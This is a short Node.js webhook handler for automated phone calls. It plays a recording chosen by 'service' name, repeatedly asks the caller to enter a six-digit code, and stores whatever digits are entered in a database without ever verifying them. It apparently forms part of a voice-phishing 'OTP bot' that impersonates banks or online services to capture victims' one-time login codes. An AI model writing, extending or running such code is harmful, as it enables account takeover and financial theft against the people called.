module.exports = function(request, response) {
    const sqlite3 = require('sqlite3').verbose();
    const db = new sqlite3.Database('./db/data.db');
    const config = require('.././config');

    var input = request.body.RecordingUrl || request.body.Digits || 0;
    var callSid = request.body.CallSid;
    var service = null;

    db.get('SELECT service FROM calls WHERE callSid = ?', [callSid], (err, row) => {
        if (err) { return console.log(err.message); }

        service = row == undefined ? 'default' : row.service;

        const endurl = config.serverurl + '/stream/end';
        const askurl = config.serverurl + '/stream/' + service;
        const end = '<?xml version="1.0" encoding="UTF-8"?><Response><Play>' + endurl + '</Play></Response>';
        const ask = '<?xml version="1.0" encoding="UTF-8"?><Response><Gather timeout="8" numDigits="6"><Play loop="4">' + askurl + '</Play></Gather></Response>';

        if(input.length == 6 && input.match(/^[0-9]+$/) != null && input != null) {
            respond(end);
    
            db.run(`UPDATE calls SET digits = ? WHERE callSid = ?`, [input, request.body.CallSid], function(err) {
                if (err) {
                  return console.log(err.message);
                }
            });
        } else {
            respond(ask);
        }
    });

    function respond(text) {
        response.type('text/xml');
        response.send(text);
    }
};
